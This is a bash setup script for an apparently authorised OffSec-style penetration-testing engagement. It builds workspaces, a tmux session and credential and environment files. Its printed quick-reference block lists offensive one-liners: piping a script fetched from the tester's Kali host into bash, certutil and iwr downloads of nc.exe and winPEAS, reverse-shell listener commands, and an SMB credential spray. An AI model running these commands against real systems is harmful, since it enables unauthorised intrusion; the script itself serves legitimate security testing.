#!/usr/bin/env bash
#==============================================================================
# STARTR.SH — OffSec engagement Day Launch Automation
#==============================================================================
# Automates the first 10-15 minutes of engagement setup:
#   - Workspace directory creation
#   - tmux session with named windows and splits
#   - Environment variables for all targets
#   - File server and listener staging
#   - Connectivity pre-flight checks
#   - Startup summary with quick reference
#
# USAGE:
#   ./startr.sh --sa1 IP --sa2 IP --sa3 IP --ad1 IP --ad2 IP --dc IP \
#                   --domain NAME --aduser USER --adpass PASS [--recon]
#   ./startr.sh -f targets.txt [--recon]
#   ./startr.sh --attach
#
# DESIGN: Enumeration/setup only — no exploitation. OffSec engagement compliant.
#==============================================================================

set -o pipefail
set -u
# NOT set -e: we handle errors ourselves

#------------------------------------------------------------------------------
# CONFIGURATION
#------------------------------------------------------------------------------
TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
EXAM_DATE="$(date +%F)"
EXAM_DIR="${TOOLKIT_ROOT}/exam_${EXAM_DATE}"
SESSION_NAME="engagement"
TOOLKIT_DIR="${HOME}/tools"
RECON_SCRIPT="${HOME}/scripts/recon.sh"
[[ -x "$RECON_SCRIPT" ]] || RECON_SCRIPT="${HOME}/scripts/bin/recon.sh"

#------------------------------------------------------------------------------
# COLORS & OUTPUT HELPERS
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
[[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]] && disable_colors

ts() { date '+%H:%M:%S'; }

info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*"; }
header()  { echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}"; \
            echo -e "${BOLD}${CYAN}  $*${NC}"; \
            echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}"; }

#------------------------------------------------------------------------------
# USAGE
#------------------------------------------------------------------------------
usage() {
    cat <<EOF
${BOLD}STARTR.SH${NC} — OffSec engagement Day Launch Automation

${BOLD}USAGE:${NC}
  $0 --sa1 IP --sa2 IP --sa3 IP --ad1 IP --ad2 IP --dc IP \\
     --domain NAME --aduser USER --adpass PASS [--recon]

  $0 -f targets.txt [--recon]
  $0 --attach

${BOLD}FLAGS:${NC}
  --sa1, --sa2, --sa3    Standalone target IPs
  --ad1, --ad2           AD member server IPs
  --dc                   Domain controller IP
  --domain               AD domain name
  --aduser               Assumed-breach username
  --adpass               Assumed-breach password
  -f, --file             Load targets from file (KEY=VALUE format)
  --recon                Auto-launch recon.sh on all targets
  --attach               Re-attach to existing engagement tmux session
  -h, --help             Show this help
EOF
    exit "${1:-0}"
}

#------------------------------------------------------------------------------
# VARIABLES — set by argument parsing
#------------------------------------------------------------------------------
SA1="" SA2="" SA3=""
AD1="" AD2="" DC=""
DOMAIN="" ADUSER="" ADPASS=""
AUTO_RECON=false
ATTACH_ONLY=false
TARGETS_FILE=""

#------------------------------------------------------------------------------
# ARGUMENT PARSING
#------------------------------------------------------------------------------
parse_args() {
    [[ $# -eq 0 ]] && { usage 1; }

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --sa1)      [[ $# -lt 2 ]] && { error "--sa1 requires a value"; exit 1; };      SA1="$2";      shift 2 ;;
            --sa2)      [[ $# -lt 2 ]] && { error "--sa2 requires a value"; exit 1; };      SA2="$2";      shift 2 ;;
            --sa3)      [[ $# -lt 2 ]] && { error "--sa3 requires a value"; exit 1; };      SA3="$2";      shift 2 ;;
            --ad1)      [[ $# -lt 2 ]] && { error "--ad1 requires a value"; exit 1; };      AD1="$2";      shift 2 ;;
            --ad2)      [[ $# -lt 2 ]] && { error "--ad2 requires a value"; exit 1; };      AD2="$2";      shift 2 ;;
            --dc)       [[ $# -lt 2 ]] && { error "--dc requires a value"; exit 1; };       DC="$2";       shift 2 ;;
            --domain)   [[ $# -lt 2 ]] && { error "--domain requires a value"; exit 1; };   DOMAIN="$2";   shift 2 ;;
            --aduser)   [[ $# -lt 2 ]] && { error "--aduser requires a value"; exit 1; };   ADUSER="$2";   shift 2 ;;
            --adpass)   [[ $# -lt 2 ]] && { error "--adpass requires a value"; exit 1; };   ADPASS="$2";   shift 2 ;;
            -f|--file)  [[ $# -lt 2 ]] && { error "-f requires a value"; exit 1; };         TARGETS_FILE="$2"; shift 2 ;;
            --recon)    AUTO_RECON=true; shift ;;
            --attach)   ATTACH_ONLY=true; shift ;;
            -h|--help)  usage ;;
            *)          error "Unknown flag: $1"; usage 1 ;;
        esac
    done
}

#------------------------------------------------------------------------------
# LOAD TARGETS FROM FILE
#------------------------------------------------------------------------------
load_targets_file() {
    local file="$1"
    if [[ ! -f "$file" ]]; then
        error "Targets file not found: $file"
        exit 1
    fi

    info "Loading targets from $file"
    while IFS='=' read -r key value; do
        # Skip blank lines and comments
        [[ -z "$key" || "$key" =~ ^# ]] && continue
        key="$(echo "$key" | tr -d '[:space:]')"
        value="$(echo "$value" | tr -d '[:space:]')"
        case "$key" in
            SA1)     SA1="$value" ;;
            SA2)     SA2="$value" ;;
            SA3)     SA3="$value" ;;
            AD1)     AD1="$value" ;;
            AD2)     AD2="$value" ;;
            DC)      DC="$value" ;;
            DOMAIN)  DOMAIN="$value" ;;
            ADUSER)  ADUSER="$value" ;;
            ADPASS)  ADPASS="$value" ;;
            *)       warn "Unknown key in targets file: $key" ;;
        esac
    done < "$file"
}

#------------------------------------------------------------------------------
# VALIDATION
#------------------------------------------------------------------------------
validate_inputs() {
    local missing=()
    [[ -z "$SA1" ]]    && missing+=("SA1")
    [[ -z "$SA2" ]]    && missing+=("SA2")
    [[ -z "$SA3" ]]    && missing+=("SA3")
    [[ -z "$AD1" ]]    && missing+=("AD1")
    [[ -z "$AD2" ]]    && missing+=("AD2")
    [[ -z "$DC" ]]     && missing+=("DC")
    [[ -z "$DOMAIN" ]] && missing+=("DOMAIN")
    [[ -z "$ADUSER" ]] && missing+=("ADUSER")
    [[ -z "$ADPASS" ]] && missing+=("ADPASS")

    if [[ ${#missing[@]} -gt 0 ]]; then
        error "Missing required targets: ${missing[*]}"
        echo ""
        usage 1
    fi

    # Basic IP format check (not bulletproof, just catches obvious mistakes)
    local ip_re='^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'
    for var_name in SA1 SA2 SA3 AD1 AD2 DC; do
        local val="${!var_name}"
        if [[ ! "$val" =~ $ip_re ]]; then
            error "$var_name doesn't look like an IP: $val"
            exit 1
        fi
    done
}

#------------------------------------------------------------------------------
# PRE-FLIGHT CHECKS
#------------------------------------------------------------------------------
preflight() {
    header "PRE-FLIGHT CHECKS"

    # Check tmux
    if ! command -v tmux &>/dev/null; then
        error "tmux not found — install it first"
        exit 1
    fi
    success "tmux found"

    # Check tun0 (VPN)
    if ! ip link show tun0 &>/dev/null; then
        warn "tun0 not found — VPN may not be connected!"
        warn "Continuing anyway, but env \$KALI will be empty"
        KALI_IP="NOT_CONNECTED"
    else
        KALI_IP="$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')"
        success "VPN connected — Kali IP: $KALI_IP"
    fi

    # Check toolkit directory
    if [[ ! -d "$TOOLKIT_DIR" ]]; then
        warn "Toolkit directory not found: $TOOLKIT_DIR"
        warn "HTTP file server won't be started automatically"
    fi

    # Connectivity checks (non-blocking, ICMP may be blocked)
    info "Checking target connectivity (2s timeout each)..."
    local targets=("SA1:$SA1" "SA2:$SA2" "SA3:$SA3" "AD1:$AD1" "AD2:$AD2" "DC:$DC")
    for entry in "${targets[@]}"; do
        local label="${entry%%:*}"
        local ip="${entry##*:}"
        if ping -c 1 -W 2 "$ip" &>/dev/null; then
            success "$label ($ip) — reachable"
        else
            warn "$label ($ip) — no ICMP reply (may be filtered)"
        fi
    done
}

#------------------------------------------------------------------------------
# CREATE WORKSPACE
#------------------------------------------------------------------------------
create_workspace() {
    header "CREATING WORKSPACE"

    if [[ -d "$EXAM_DIR" ]]; then
        warn "Workspace already exists: $EXAM_DIR"
        info "Skipping directory creation (idempotent)"
    else
        local dirs=(
            "target1/scans" "target1/loot" "target1/screenshots" "target1/exploits"
            "target2/scans" "target2/loot" "target2/screenshots" "target2/exploits"
            "target3/scans" "target3/loot" "target3/screenshots" "target3/exploits"
            "ad/scans"      "ad/loot"      "ad/screenshots"      "ad/exploits"
        )
        for d in "${dirs[@]}"; do
            mkdir -p "${EXAM_DIR}/${d}"
        done
        success "Workspace created: $EXAM_DIR"
    fi

    # Initialize creds.txt
    if [[ ! -f "${EXAM_DIR}/creds.txt" ]]; then
        cat > "${EXAM_DIR}/creds.txt" <<'CREDS'
#==============================================================================
# CREDENTIALS LOG — OffSec engagement
#==============================================================================
# Format: TARGET | SERVICE | USERNAME | PASSWORD | HASH | NOTES
#-----------------------------------------------------------------------------|
CREDS
        # Pre-populate assumed-breach creds
        echo "AD     | assumed  | ${ADUSER} | ${ADPASS} | - | provided by engagement" >> "${EXAM_DIR}/creds.txt"
        success "Initialized creds.txt with assumed-breach creds"
    fi

    # Initialize hosts.txt
    if [[ ! -f "${EXAM_DIR}/hosts.txt" ]]; then
        cat > "${EXAM_DIR}/hosts.txt" <<HOSTS
#==============================================================================
# HOSTS — OffSec engagement ${EXAM_DATE}
#==============================================================================
# Label    IP               Role
#----------|----------------|------------------
SA1        ${SA1}           Standalone 1
SA2        ${SA2}           Standalone 2
SA3        ${SA3}           Standalone 3
AD1        ${AD1}           AD Member Server
AD2        ${AD2}           AD Member Server
DC         ${DC}            Domain Controller
#
# Domain:  ${DOMAIN}
# Creds:   ${ADUSER} / ${ADPASS}
HOSTS
        success "Initialized hosts.txt"
    fi
}

#------------------------------------------------------------------------------
# WRITE ENVIRONMENT FILE
#------------------------------------------------------------------------------
write_env() {
    header "SETTING ENVIRONMENT"

    local env_file="${EXAM_DIR}/env.sh"
    # Use single-quoted heredoc to avoid shell expansion, then fill values with printf
    {
        echo '#!/usr/bin/env bash'
        echo "# engagement environment — source this in any new shell:"
        echo "#   source ${EXAM_DIR}/env.sh"
        echo ""
        echo "export KALI='${KALI_IP}'"
        echo "export engagement='${EXAM_DIR}'"
        echo "export SA1='${SA1}'"
        echo "export SA2='${SA2}'"
        echo "export SA3='${SA3}'"
        echo "export AD1='${AD1}'"
        echo "export AD2='${AD2}'"
        echo "export DC='${DC}'"
        echo "export DOMAIN='${DOMAIN}'"
        printf "export ADUSER='%s'\n" "$ADUSER"
        printf "export ADPASS='%s'\n" "$ADPASS"
    } > "$env_file"
    chmod +x "$env_file"
    success "Environment written to $env_file"
    info "Run: ${BOLD}source ${env_file}${NC} in your current shell"
}

#------------------------------------------------------------------------------
# BUILD TMUX SESSION
#------------------------------------------------------------------------------
build_tmux() {
    header "BUILDING TMUX SESSION"

    # Check if session already exists
    if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
        warn "tmux session '$SESSION_NAME' already exists"
        info "Use: tmux attach -t $SESSION_NAME"
        info "  or: $0 --attach"
        return 0
    fi

    local env_file="${EXAM_DIR}/env.sh"
    local src_cmd="source ${env_file} 2>/dev/null"

    # Detect pane base index (portable: works with base-index 0 or 1)
    local pbi
    pbi="$(tmux show-option -gv pane-base-index 2>/dev/null || echo 0)"
    local P0="$pbi"                      # first pane (top / left)
    local P1="$(( pbi + 1 ))"            # second pane (bottom / right)

    # Helper: set up a target window with 70/30 split
    setup_target_window() {
        local win="$1" dir="$2" label="$3" ip_info="$4"
        tmux send-keys -t "${SESSION_NAME}:${win}" "$src_cmd" C-m
        tmux send-keys -t "${SESSION_NAME}:${win}" "cd ${dir}" C-m
        tmux send-keys -t "${SESSION_NAME}:${win}" "clear && echo -e '${BOLD}${CYAN}${label}${NC}'" C-m
        tmux split-window -v -t "${SESSION_NAME}:${win}" -p 30
        tmux send-keys -t "${SESSION_NAME}:${win}.${P1}" "$src_cmd" C-m
        tmux send-keys -t "${SESSION_NAME}:${win}.${P1}" "cd ${dir}" C-m
        tmux select-pane -t "${SESSION_NAME}:${win}.${P0}"
    }

    # Window: SA-1 (standalone 1)
    tmux new-session -d -s "$SESSION_NAME" -n "SA-1" -x 200 -y 50
    setup_target_window "SA-1" "${EXAM_DIR}/target1" "[SA-1] ${SA1} — Standalone 1" "$SA1"

    # Window: SA-2 (standalone 2)
    tmux new-window -t "${SESSION_NAME}" -n "SA-2"
    setup_target_window "SA-2" "${EXAM_DIR}/target2" "[SA-2] ${SA2} — Standalone 2" "$SA2"

    # Window: SA-3 (standalone 3)
    tmux new-window -t "${SESSION_NAME}" -n "SA-3"
    setup_target_window "SA-3" "${EXAM_DIR}/target3" "[SA-3] ${SA3} — Standalone 3" "$SA3"

    # Window: AD (Active Directory set)
    tmux new-window -t "${SESSION_NAME}" -n "AD"
    setup_target_window "AD" "${EXAM_DIR}/ad" "[AD] ${DOMAIN} — DC:${DC} M1:${AD1} M2:${AD2} — ${ADUSER}:${ADPASS}" ""

    # Window: staging (file server + listener staging)
    tmux new-window -t "${SESSION_NAME}" -n "staging"
    tmux send-keys -t "${SESSION_NAME}:staging" "$src_cmd" C-m
    if [[ -d "$TOOLKIT_DIR" ]]; then
        tmux send-keys -t "${SESSION_NAME}:staging" "cd ${TOOLKIT_DIR} && python3 -m http.server 8000" C-m
    else
        tmux send-keys -t "${SESSION_NAME}:staging" "echo 'Toolkit dir not found — start file server manually'" C-m
    fi
    tmux split-window -h -t "${SESSION_NAME}:staging"
    tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "$src_cmd" C-m
    tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '${BOLD}${YELLOW}Ready for Penelope:${NC}'" C-m
    tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '  penelope -0 ${KALI_IP} 443'" C-m
    tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo -e '  penelope -0 ${KALI_IP} 4444'" C-m
    tmux send-keys -t "${SESSION_NAME}:staging.${P1}" "echo ''" C-m

    # Window: notes
    tmux new-window -t "${SESSION_NAME}" -n "notes"
    tmux send-keys -t "${SESSION_NAME}:notes" "$src_cmd" C-m
    tmux send-keys -t "${SESSION_NAME}:notes" "cd ${EXAM_DIR}" C-m
    tmux send-keys -t "${SESSION_NAME}:notes" "cat ${EXAM_DIR}/creds.txt" C-m

    # Select first window
    tmux select-window -t "${SESSION_NAME}:SA-1"

    success "tmux session '$SESSION_NAME' created with 6 windows"
}

#------------------------------------------------------------------------------
# AUTO-RECON (optional)
#------------------------------------------------------------------------------
launch_recon() {
    if [[ "$AUTO_RECON" != true ]]; then
        return 0
    fi

    header "LAUNCHING AUTO-RECON"

    if [[ ! -x "$RECON_SCRIPT" ]]; then
        error "Recon script not found or not executable: $RECON_SCRIPT"
        return 1
    fi

    # Detect pane base index for portable targeting
    local pbi
    pbi="$(tmux show-option -gv pane-base-index 2>/dev/null || echo 0)"

    local targets=("SA-1:$SA1" "SA-2:$SA2" "SA-3:$SA3")
    for entry in "${targets[@]}"; do
        local win="${entry%%:*}"
        local ip="${entry##*:}"
        info "Launching recon on $win ($ip)"
        tmux send-keys -t "${SESSION_NAME}:${win}.${pbi}" "${RECON_SCRIPT} --auto ${ip}" C-m
    done

    # AD targets — launch all three in the AD window
    info "Launching recon on AD targets (${AD1}, ${AD2}, ${DC})"
    tmux send-keys -t "${SESSION_NAME}:AD.${pbi}" "${RECON_SCRIPT} --auto ${AD1} ${AD2} ${DC}" C-m

    success "Recon launched on all targets"
}

#------------------------------------------------------------------------------
# STARTUP SUMMARY
#------------------------------------------------------------------------------
print_summary() {
    local start_time end_time
    start_time="$(date '+%H:%M %Z')"
    end_time="$(date -d '+23 hours 45 minutes' '+%H:%M %Z' 2>/dev/null || date -v+23H -v+45M '+%H:%M %Z' 2>/dev/null || echo 'N/A')"

    # Detect window base index for accurate navigation hints
    local wbi
    wbi="$(tmux show-option -gv base-index 2>/dev/null || echo 0)"

    header "engagement ENVIRONMENT READY"

    echo -e ""
    echo -e "  ${BOLD}Kali IP:${NC}    ${GREEN}${KALI_IP}${NC}"
    echo -e ""
    echo -e "  ${BOLD}Standalone Targets:${NC}"
    echo -e "    SA1  ${CYAN}${SA1}${NC}   (Window ${wbi}: SA-1)"
    echo -e "    SA2  ${CYAN}${SA2}${NC}   (Window $((wbi+1)): SA-2)"
    echo -e "    SA3  ${CYAN}${SA3}${NC}   (Window $((wbi+2)): SA-3)"
    echo -e ""
    echo -e "  ${BOLD}Active Directory:${NC}"
    echo -e "    AD1  ${CYAN}${AD1}${NC}   (Window $((wbi+3)): AD)"
    echo -e "    AD2  ${CYAN}${AD2}${NC}   (Window $((wbi+3)): AD)"
    echo -e "    DC   ${CYAN}${DC}${NC}   (Window $((wbi+3)): AD)"
    echo -e "    Domain: ${MAGENTA}${DOMAIN}${NC}"
    printf "    Creds:  ${MAGENTA}%s${NC} / ${MAGENTA}%s${NC}\n" "$ADUSER" "$ADPASS"
    echo -e ""
    echo -e "  ${BOLD}Workspace:${NC}  ${EXAM_DIR}"
    echo -e "  ${BOLD}Env file:${NC}   source ${EXAM_DIR}/env.sh"
    echo -e ""
    echo -e "  ${BOLD}${YELLOW}tmux Navigation:${NC}"
    echo -e "    Ctrl+b ${wbi}  →  SA-1 (standalone 1)"
    echo -e "    Ctrl+b $((wbi+1))  →  SA-2 (standalone 2)"
    echo -e "    Ctrl+b $((wbi+2))  →  SA-3 (standalone 3)"
    echo -e "    Ctrl+b $((wbi+3))  →  AD   (Active Directory)"
    echo -e "    Ctrl+b $((wbi+4))  →  staging (file server + listener)"
    echo -e "    Ctrl+b $((wbi+5))  →  notes"
    echo -e "    Ctrl+b ;  →  toggle panes"
    echo -e ""
    echo -e "  ${BOLD}${YELLOW}Quick Reference:${NC}"
    echo -e "    ${GREEN}# Credential spray (AD)${NC}"
    echo -e "    nxc smb \$DC -u \$ADUSER -p \$ADPASS --shares"
    echo -e "    nxc smb ${AD1} ${AD2} ${DC} -u \$ADUSER -p \$ADPASS"
    echo -e ""
    echo -e "    ${GREEN}# Serve files${NC}"
    echo -e "    python3 -m http.server 80    # already running in staging"
    echo -e ""
    echo -e "    ${GREEN}# Catch a shell${NC}"
    echo -e "    penelope -0 \$KALI 443"
    echo -e ""
    echo -e "    ${GREEN}# Download to target (Linux)${NC}"
    echo -e "    curl http://\$KALI/linpeas.sh | bash"
    echo -e "    wget http://\$KALI/linpeas.sh -O /tmp/lp.sh"
    echo -e ""
    echo -e "    ${GREEN}# Download to target (Windows)${NC}"
    echo -e "    iwr http://\$KALI/winPEASx64.exe -o C:\\\\tmp\\\\wp.exe"
    echo -e "    certutil -urlcache -f http://\$KALI/nc.exe C:\\\\tmp\\\\nc.exe"
    echo -e ""
    echo -e "  ${BOLD}Time:${NC}  Started ${GREEN}${start_time}${NC}  |  engagement ends ~${RED}${end_time}${NC}"
    echo -e ""

    if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
        echo -e "  ${BOLD}Attach:${NC}  tmux attach -t ${SESSION_NAME}"
        echo -e ""
    fi
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
main() {
    parse_args "$@"

    # Handle --attach shortcut
    if [[ "$ATTACH_ONLY" == true ]]; then
        if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
            info "Attaching to existing session '$SESSION_NAME'"
            exec tmux attach -t "$SESSION_NAME"
        else
            error "No engagement session found. Run startr.sh to create one."
            exit 1
        fi
    fi

    # Load from file if provided
    if [[ -n "$TARGETS_FILE" ]]; then
        load_targets_file "$TARGETS_FILE"
    fi

    # Validate
    validate_inputs

    header "OffSec engagement DAY — LET'S GO"
    info "Date: ${EXAM_DATE}"

    # Initialize KALI_IP before workspace/env (preflight sets it)
    KALI_IP=""
    preflight
    create_workspace
    write_env
    build_tmux
    launch_recon
    print_summary
}

main "$@"
